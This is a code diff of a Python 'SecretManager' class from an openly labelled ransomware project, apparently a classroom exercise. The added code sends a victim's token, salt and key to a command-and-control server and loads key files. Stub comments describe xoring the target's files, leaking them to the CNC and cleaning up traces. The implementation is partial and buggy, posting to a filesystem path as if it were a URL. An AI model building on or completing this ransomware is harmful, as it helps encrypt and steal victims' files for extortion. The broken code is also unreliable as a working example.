@@ -6,6 +6,7 @@ from typing import List, Tuple
 import os.path
 import requests
 import base64
+import json
 
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
@@ -50,37 +51,69 @@ class SecretManager:
         tmp = base64.b64encode(data)
         return str(tmp, "utf8")
 
+
     def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
-        # register the victim to the CNC
-        raise NotImplemented()
+        
+        elements = {
+            "token" : self.bin_to_b64(token),
+            "salt" : self.bin_to_b64(salt),
+            "key" : self.bin_to_b64(key)
+        }
+        jsonElements = json.dumps(elements)
+        requests.post(self._path, jsonElements)
+        
 
     def setup(self)->None:
         # main function to create crypto data and register malware to cnc
-        raise NotImplemented()
+        self._path = "/root/CNC"
+        
+        file = open(self._path + "salt.bin", "rb")
+        self._salt = file.read()
+        file.close()
+
+        # on vérifie si le fichier est présent dans le répertoire
+        if os.path.isfile(os.path.join(self._path, "token.bin")):
+            file = open(self._path + "token.bin", "rb")
+            self._token = file.read()
+            file.close()
+        else:
+            with open("token.bin", "w") as file:
+                file.write("")
+            
+
+
+
+
 
     def load(self)->None:
         # function to load crypto data
         raise NotImplemented()
 
+
     def check_key(self, candidate_key:bytes)->bool:
         # Assert the key is valid
         raise NotImplemented()
+
 
     def set_key(self, b64_key:str)->None:
         # If the key is valid, set the self._key var for decrypting
         raise NotImplemented()
 
+
     def get_hex_token(self)->str:
         # Should return a string composed of hex symbole, regarding the token
         raise NotImplemented()
+
 
     def xorfiles(self, files:List[str])->None:
         # xor a list for file
         raise NotImplemented()
 
+
     def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
         raise NotImplemented()
+
 
     def clean(self):
         # remove crypto data from the target
